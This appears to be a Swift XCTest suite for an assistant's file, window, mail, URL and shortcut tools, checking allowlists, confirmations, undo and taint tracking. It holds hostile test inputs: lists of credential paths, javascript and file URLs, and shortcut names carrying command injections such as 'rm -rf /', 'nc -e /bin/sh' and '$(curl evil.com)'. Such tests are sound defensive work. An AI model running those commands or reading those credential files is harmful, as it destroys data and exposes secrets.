import CoreGraphics
import Foundation
import XCTest
@testable import PearlCore
@testable import PearlTools

final class ExpandedToolsTests: XCTestCase {
    
    private var tempDirectory: URL!
    
    override func setUp() async throws {
        try await super.setUp()
        TaintTracker.shared.reset()
        await UndoJournal.shared.clear()
        
        let tempBase = FileManager.default.temporaryDirectory
        tempDirectory = tempBase.appendingPathComponent("PearlExpandedToolsTests_\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: tempDirectory, withIntermediateDirectories: true)
    }
    
    override func tearDown() async throws {
        if let temp = tempDirectory {
            try? FileManager.default.removeItem(at: temp)
        }
        TaintTracker.shared.reset()
        await UndoJournal.shared.clear()
        try await super.tearDown()
    }
    
    // MARK: - 1. FolderAllowlistValidator Tests
    
    func testFolderAllowlistValidatorValidPath() throws {
        let allowedFolder = tempDirectory.appendingPathComponent("Allowed").path
        try FileManager.default.createDirectory(atPath: allowedFolder, withIntermediateDirectories: true)
        
        let testFile = allowedFolder + "/sample.txt"
        try "Hello Pearl".write(toFile: testFile, atomically: true, encoding: .utf8)
        
        let validator = FolderAllowlistValidator(allowedFolders: [allowedFolder])
        let result = validator.validate(path: testFile)
        
        switch result {
        case .success(let resolved):
            XCTAssertEqual(resolved, testFile)
        case .failure(let error):
            XCTFail("Valid path should succeed, got error: \(error)")
        }
    }
    
    func testFolderAllowlistValidatorOutsidePathBlocked() throws {
        let allowedFolder = tempDirectory.appendingPathComponent("Allowed").path
        let outsideFolder = tempDirectory.appendingPathComponent("Outside").path
        try FileManager.default.createDirectory(atPath: allowedFolder, withIntermediateDirectories: true)
        try FileManager.default.createDirectory(atPath: outsideFolder, withIntermediateDirectories: true)
        
        let outsideFile = outsideFolder + "/secret.txt"
        try "Forbidden".write(toFile: outsideFile, atomically: true, encoding: .utf8)
        
        let validator = FolderAllowlistValidator(allowedFolders: [allowedFolder])
        let result = validator.validate(path: outsideFile)
        
        switch result {
        case .success(let path):
            XCTFail("Outside path should be rejected, but succeeded with: \(path)")
        case .failure(let error):
            if case .outsideAllowedFolders = error {
                // Expected
            } else {
                XCTFail("Expected .outsideAllowedFolders error, got: \(error)")
            }
        }
    }
    
    func testFolderAllowlistValidatorSymlinkEscapeBlocked() throws {
        let allowedFolder = tempDirectory.appendingPathComponent("Allowed").path
        let targetOutsideFolder = tempDirectory.appendingPathComponent("TargetOutside").path
        try FileManager.default.createDirectory(atPath: allowedFolder, withIntermediateDirectories: true)
        try FileManager.default.createDirectory(atPath: targetOutsideFolder, withIntermediateDirectories: true)
        
        let secretFile = targetOutsideFolder + "/escaped.txt"
        try "Private Data".write(toFile: secretFile, atomically: true, encoding: .utf8)
        
        // Create symlink inside allowed folder pointing to outside file
        let symlinkPath = allowedFolder + "/symlink_escape.txt"
        try FileManager.default.createSymbolicLink(atPath: symlinkPath, withDestinationPath: secretFile)
        
        let validator = FolderAllowlistValidator(allowedFolders: [allowedFolder])
        let result = validator.validate(path: symlinkPath)
        
        switch result {
        case .success(let resolved):
            XCTFail("Symlink escape outside allowed folders must be blocked, resolved to: \(resolved)")
        case .failure(let error):
            if case .outsideAllowedFolders = error {
                // Expected: resolved path points outside allowed folder
            } else {
                XCTFail("Expected outsideAllowedFolders failure, got: \(error)")
            }
        }
    }
    
    func testFolderAllowlistValidatorNeverTierPathsBlocked() {
        let validator = FolderAllowlistValidator(allowedFolders: ["/"])
        
        let forbiddenPaths = [
            "~/.ssh/id_rsa",
            "~/.aws/credentials",
            "~/.gnupg/secring.gpg",
            "/System/Library/CoreServices",
            "/etc/hosts",
            "/private/etc/passwd",
            "~/Projects/app/.env",
            "~/Library/Keychains/login.keychain-db"
        ]
        
        for path in forbiddenPaths {
            let res = validator.validate(path: path)
            switch res {
            case .success(let resolved):
                XCTFail("Forbidden path '\(path)' was allowed! Resolved: \(resolved)")
            case .failure(let error):
                XCTAssertTrue(
                    error.localizedDescription.contains("NeverTier") ||
                    error.localizedDescription.contains("sensitive") ||
                    error.localizedDescription.contains("forbidden") ||
                    error.localizedDescription.contains("outside"),
                    "Path '\(path)' correctly blocked: \(error.localizedDescription)"
                )
            }
        }
    }
    
    // MARK: - 2. CopyFileTool + Undo Tests
    
    func testCopyFileToolExecutionAndUndo() async throws {
        let allowed = tempDirectory.path
        let validator = FolderAllowlistValidator(allowedFolders: [allowed])
        let tool = CopyFileTool(validator: validator)
        
        let srcPath = allowed + "/test_src.txt"
        let dstPath = allowed + "/test_dst.txt"
        try "Copy test content".write(toFile: srcPath, atomically: true, encoding: .utf8)
        
        let context = ToolExecutionContext(trustState: .trusted)
        let result = try await tool.execute(args: ["source": srcPath, "destination": dstPath], context: context)
        
        XCTAssertTrue(result.success)
        XCTAssertTrue(FileManager.default.fileExists(atPath: dstPath))
        XCTAssertNotNil(result.undoAction, "CopyFileTool must return an undoAction")
        
        // Execute undo
        try await result.undoAction?()
        XCTAssertFalse(FileManager.default.fileExists(atPath: dstPath), "Undo must remove destination file")
        XCTAssertTrue(FileManager.default.fileExists(atPath: srcPath), "Source file must remain intact")
    }
    
    // MARK: - 3. MoveFileTool Policy & Undo Tests
    
    func testMoveFileToolTierAndPolicyEnforcement() async throws {
        let allowed = tempDirectory.path
        let validator = FolderAllowlistValidator(allowedFolders: [allowed])
        let tool = MoveFileTool(validator: validator)
        
        XCTAssertEqual(tool.tier, .t3WorkspaceChanges)
        XCTAssertTrue(tool.isReversible)
        
        let srcPath = allowed + "/move_src.txt"
        let dstPath = allowed + "/move_dst.txt"
        try "Move test content".write(toFile: srcPath, atomically: true, encoding: .utf8)
        
        let policyEngine = PolicyEngine.shared
        
        // 1. Untrusted context without confirmation -> confirmation required
        let unconfirmedContext = ToolExecutionContext(trustState: .untrusted, userConfirmed: false)
        let decision = policyEngine.evaluate(tool: tool, args: ["source": srcPath, "destination": dstPath], context: unconfirmedContext)
        if case .confirmationRequired(let reason) = decision {
            XCTAssertTrue(reason.contains("move_file") || reason.contains("Confirmation required"))
        } else {
            XCTFail("Expected .confirmationRequired for move_file in untrusted context, got: \(decision)")
        }
        
        // 2. Confirmed context -> allowed and executes
        let confirmedContext = ToolExecutionContext(trustState: .trusted, userConfirmed: true)
        let result = try await tool.execute(args: ["source": srcPath, "destination": dstPath], context: confirmedContext)
        XCTAssertTrue(result.success)
        XCTAssertTrue(FileManager.default.fileExists(atPath: dstPath))
        XCTAssertFalse(FileManager.default.fileExists(atPath: srcPath))
        XCTAssertNotNil(result.undoAction)
        
        // 3. Undo move
        try await result.undoAction?()
        XCTAssertTrue(FileManager.default.fileExists(atPath: srcPath), "Undo must restore file to source")
        XCTAssertFalse(FileManager.default.fileExists(atPath: dstPath), "Destination file must be removed after move undo")
    }
    
    // MARK: - 4. ReadFileSafeTool Taint Tests
    
    func testReadFileSafeToolReturnsUntrustedAndTaintsContext() async throws {
        let allowed = tempDirectory.path
        let validator = FolderAllowlistValidator(allowedFolders: [allowed])
        let tool = ReadFileSafeTool(validator: validator)
        
        let testPath = allowed + "/untrusted_content.txt"
        try "This is untrusted content from a file.".write(toFile: testPath, atomically: true, encoding: .utf8)
        
        TaintTracker.shared.reset()
        XCTAssertFalse(TaintTracker.shared.currentState.isTainted)
        
        let context = ToolExecutionContext(trustState: .trusted)
        let result = try await tool.execute(args: ["path": testPath], context: context)
        
        XCTAssertTrue(result.success)
        XCTAssertEqual(result.trust, .untrusted, "ReadFileSafeTool must return untrusted trust level")
        XCTAssertTrue(TaintTracker.shared.currentState.isTainted, "Context must be tainted after reading file")
    }
    
    // MARK: - 5. OpenURLTool Scheme Restrictions
    
    func testOpenURLToolBlocksInvalidSchemes() async throws {
        let tool = OpenURLTool()
        let context = ToolExecutionContext(trustState: .trusted)
        
        let blockedURLs = [
            "javascript:alert(document.cookie)",
            "file:///etc/passwd",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "ftp://ftp.example.com/file.zip",
            "pearl://execute?cmd=rm"
        ]
        
        for url in blockedURLs {
            let result = try await tool.execute(args: ["url": url], context: context)
            XCTAssertFalse(result.success, "URL '\(url)' must be blocked by OpenURLTool")
            XCTAssertTrue(result.message.contains("Only http:// and https:// URLs are permitted") || result.message.contains("URL blocked"))
        }
    }
    
    func testOpenURLToolValidHTTPSScheme() {
        let tool = OpenURLTool()
        XCTAssertEqual(tool.tier, .t1Reversible)
        XCTAssertFalse(tool.isReversible)
        XCTAssertEqual(tool.name, "open_url")
    }
    
    // MARK: - 6. SendMailTool Policy & Confirmation
    
    func testSendMailToolRequiresConfirmation() async throws {
        let tool = SendMailTool()
        XCTAssertEqual(tool.tier, .t4ExternalSideEffects)
        XCTAssertFalse(tool.isReversible)
        
        let args = ["to": "user@example.com", "subject": "Test", "body": "Hello"]
        
        // 1. Tool execution without confirmation fails immediately
        let unconfirmedContext = ToolExecutionContext(trustState: .trusted, userConfirmed: false)
        let result = try await tool.execute(args: args, context: unconfirmedContext)
        XCTAssertFalse(result.success)
        XCTAssertTrue(result.message.contains("External side effect policy refusal"))
        
        // 2. PolicyEngine requires confirmation for T4
        let policyEngine = PolicyEngine.shared
        let decision = policyEngine.evaluate(tool: tool, args: args, context: unconfirmedContext)
        if case .confirmationRequired(let reason) = decision {
            XCTAssertTrue(reason.contains("send_mail") || reason.contains("external"))
        } else {
            XCTFail("Expected .confirmationRequired for send_mail, got: \(decision)")
        }
    }
    
    func testCreateMailDraftToolMetadata() {
        let tool = CreateMailDraftTool()
        XCTAssertEqual(tool.name, "create_mail_draft")
        XCTAssertEqual(tool.tier, .t2ReadPersonal)
        XCTAssertFalse(tool.isReversible)
    }
    
    // MARK: - 7. Window Tools Tests
    
    func testListWindowsToolExecution() async throws {
        let tool = ListWindowsTool()
        XCTAssertEqual(tool.name, "list_windows")
        XCTAssertEqual(tool.tier, .t0Observe)
        XCTAssertEqual(tool.requiredTCC, [.accessibility])
        
        let context = ToolExecutionContext(trustState: .trusted)
        let result = try await tool.execute(args: [:], context: context)
        XCTAssertTrue(result.success)
        XCTAssertFalse(result.message.isEmpty)
    }
    
    func testManageWindowToolMetadata() {
        let tool = ManageWindowTool()
        XCTAssertEqual(tool.name, "manage_window")
        XCTAssertEqual(tool.tier, .t1Reversible)
        XCTAssertEqual(tool.requiredTCC, [.accessibility])
        XCTAssertFalse(tool.isReversible)
    }
    
    // MARK: - 8. Shortcuts Tool Tests
    
    func testShortcutsToolValidation() {
        XCTAssertTrue(RunShortcutTool.isSafeShortcutName("Daily Standup"))
        XCTAssertTrue(RunShortcutTool.isSafeShortcutName("Focus-Mode_2026"))
        
        XCTAssertFalse(RunShortcutTool.isSafeShortcutName("test; rm -rf /"))
        XCTAssertFalse(RunShortcutTool.isSafeShortcutName("run & killall pearl"))
        XCTAssertFalse(RunShortcutTool.isSafeShortcutName("shortcut | nc -e /bin/sh"))
        XCTAssertFalse(RunShortcutTool.isSafeShortcutName("`whoami`"))
        XCTAssertFalse(RunShortcutTool.isSafeShortcutName("$(curl evil.com)"))
        XCTAssertFalse(RunShortcutTool.isSafeShortcutName(""))
    }
    
    // MARK: - 9. CentralToolCatalog & MCP Exposure Tests
    
    func testAllExpandedToolsHaveMCPExposedFalse() {
        let catalog = CentralToolCatalog.shared
        catalog.registerDefaultPearlTools()
        
        let expandedToolNames = [
            "search_files",
            "read_file_safe",
            "copy_file",
            "move_file",
            "list_windows",
            "manage_window",
            "list_shortcuts",
            "run_shortcut",
            "list_browser_tabs",
            "open_url",
            "read_active_tab",
            "create_mail_draft",
            "send_mail",
            "read_screen_text"
        ]
        
        for name in expandedToolNames {
            guard let meta = catalog.metadata(for: name) else {
                XCTFail("Missing metadata for tool '\(name)' in CentralToolCatalog")
                continue
            }
            XCTAssertFalse(
                meta.mcpExposed,
                "Tool '\(name)' MUST have mcpExposed == false to protect MCP security boundary!"
            )
        }
        
        // Verify catalog.exposedTools(for: .mcp) contains NONE of the 14 new tools
        let mcpTools = catalog.exposedTools(for: .mcp)
        let mcpNames = Set(mcpTools.map { $0.name.lowercased() })
        
        for name in expandedToolNames {
            XCTAssertFalse(
                mcpNames.contains(name.lowercased()),
                "Exposed MCP tools must NOT include '\(name)'"
            )
        }
    }
    
    // MARK: - 10. DeterministicRouter Rules Tests
    
    func testDeterministicRouterExpandedPhrases() {
        let router = DeterministicRouter.shared
        
        // Windows
        XCTAssertEqual(router.resolve(utterance: "list windows")?.toolName, "list_windows")
        XCTAssertEqual(router.resolve(utterance: "show open windows")?.toolName, "list_windows")
        XCTAssertEqual(router.resolve(utterance: "pearl please list windows")?.toolName, "list_windows")
        
        // Screen OCR
        XCTAssertEqual(router.resolve(utterance: "what is on my screen")?.toolName, "read_screen_text")
        XCTAssertEqual(router.resolve(utterance: "what's on my screen")?.toolName, "read_screen_text")
        XCTAssertEqual(router.resolve(utterance: "read my screen")?.toolName, "read_screen_text")
        
        // Shortcuts
        XCTAssertEqual(router.resolve(utterance: "list shortcuts")?.toolName, "list_shortcuts")
        XCTAssertEqual(router.resolve(utterance: "show shortcuts")?.toolName, "list_shortcuts")
        
        // Browser tabs
        XCTAssertEqual(router.resolve(utterance: "list browser tabs")?.toolName, "list_browser_tabs")
        XCTAssertEqual(router.resolve(utterance: "show browser tabs")?.toolName, "list_browser_tabs")
        XCTAssertEqual(router.resolve(utterance: "what tabs are open")?.toolName, "list_browser_tabs")
        
        // Negation guard must still abort
        XCTAssertNil(router.resolve(utterance: "don't list windows"))
        XCTAssertNil(router.resolve(utterance: "cancel that read my screen"))
        XCTAssertNil(router.resolve(utterance: "do not show shortcuts"))
    }
    
    // MARK: - 11. ScreenReadTool In-Memory OCR Test
    
    func testScreenReadToolVisionTextRecognition() async throws {
        let tool = ScreenReadTool()
        XCTAssertEqual(tool.name, "read_screen_text")
        XCTAssertEqual(tool.tier, .t0Observe)
        XCTAssertEqual(tool.requiredTCC, [.screenRecording])
        
        // Create an in-memory CGImage with black text on white background
        let width = 400
        let height = 100
        let colorSpace = CGColorSpaceCreateDeviceRGB()
        let bitmapInfo = CGImageAlphaInfo.premultipliedLast.rawValue
        
        guard let context = CGContext(
            data: nil,
            width: width,
            height: height,
            bitsPerComponent: 8,
            bytesPerRow: width * 4,
            space: colorSpace,
            bitmapInfo: bitmapInfo
        ) else {
            XCTFail("Could not create in-memory CGContext")
            return
        }
        
        // Fill white
        context.setFillColor(CGColor(red: 1, green: 1, blue: 1, alpha: 1))
        context.fill(CGRect(x: 0, y: 0, width: width, height: height))
        
        // Draw black text "PEARL OCR TEST"
        let testString = "PEARL OCR TEST" as CFString
        let font = CTFontCreateWithName("Helvetica" as CFString, 36, nil)
        let attrString = CFAttributedStringCreate(nil, testString, [
            kCTFontAttributeName: font,
            kCTForegroundColorAttributeName: CGColor(red: 0, green: 0, blue: 0, alpha: 1)
        ] as CFDictionary)
        
        let line = CTLineCreateWithAttributedString(attrString!)
        context.textPosition = CGPoint(x: 20, y: 35)
        CTLineDraw(line, context)
        
        guard let cgImage = context.makeImage() else {
            XCTFail("Could not create CGImage from context")
            return
        }
        
        // Recognize text using in-memory Vision
        let recognized = try await tool.recognizeText(in: cgImage)
        XCTAssertTrue(
            recognized.contains("PEARL") || recognized.contains("OCR"),
            "Vision OCR should recognize rendered text in memory, recognized: '\(recognized)'"
        )
    }
}
